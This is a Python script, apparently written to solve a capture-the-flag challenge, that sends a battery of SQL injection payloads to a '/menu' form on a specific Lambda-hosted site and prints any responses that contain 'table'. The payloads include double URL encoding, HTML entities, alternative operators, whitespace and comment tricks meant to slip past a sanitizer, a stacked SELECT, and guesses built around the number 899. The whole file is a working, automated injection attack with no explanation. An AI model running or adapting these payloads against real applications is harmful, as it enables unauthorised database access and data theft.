import requests
from urllib.parse import quote

def test_injection(url, payload, encode=False):
    """
    Send SQL injection payload and return the response
    """
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'Referer': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu'
    }
    
    if encode:
        payload = quote(payload)
    
    data = {'query': payload}
    response = requests.post(url + '/menu', headers=headers, data=data)
    print(f"Trying: {payload}")
    print(f"Response length: {len(response.text)}")
    if "table" in response.text.lower():
        print("Found results!")
        print(response.text)
    return response.text

def main():
    base_url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws"
    
    # Double encoding variations
    encoded_payloads = [
        quote("' OR '1'='1"),
        quote(quote("' OR '1'='1")),
        "%27%20OR%20%271%27%3D%271",
        "%2527%2520OR%2520%25271%2527%253D%25271"
    ]
    
    # HTML entity encoding
    html_encoded = [
        "&#x27; OR &#x27;1&#x27;=&#x27;1",
        "&apos; OR &apos;1&apos;=&apos;1"
    ]
    
    # Alternative operators
    operator_payloads = [
        "' || '1'='1",    # Using OR alternative
        "' && '1'='1",    # Using AND alternative
        "' <> '0'='1",    # Using not equal
        "' LIKE '1'='1",
        "' IN ('1')='1"
    ]
    
    # Sanitizer-focused (since mentioned in challenge)
    sanitizer_payloads = [
        "'/**/OR/**/'1'='1",
        "'%20OR%20'1'='1",
        "'%09OR%09'1'='1",
        "'%0dOR%0d'1'='1",
        "'%0aOR%0a'1'='1",
        "'%0bOR%0b'1'='1",
        "'%0cOR%0c'1'='1",
        "'+OR+'1'='1",
        "' OR/**/TRUE",
        "';SELECT/**/*/**/FROM/**/menu--",
        "'%3bSELECT%2f%2a%2a%2f%2a%2a%2fFROM%2f%2a%2a%2fmenu--"
    ]
    
    # Number 899 related (from challenge)
    number_payloads = [
        "' OR price=899 -- ",
        "' OR '899'='899",
        "' OR 899=899 -- ",
        "' OR id=899 -- ",
        "' OR dish LIKE '%899%' -- "
    ]
    
    all_payloads = (encoded_payloads + html_encoded  + 
                    operator_payloads + sanitizer_payloads + number_payloads)
    
    # Try each payload both normally and URL encoded
    for payload in all_payloads:
        test_injection(base_url, payload, encode=False)
        test_injection(base_url, payload, encode=True)

if __name__ == "__main__":
    main()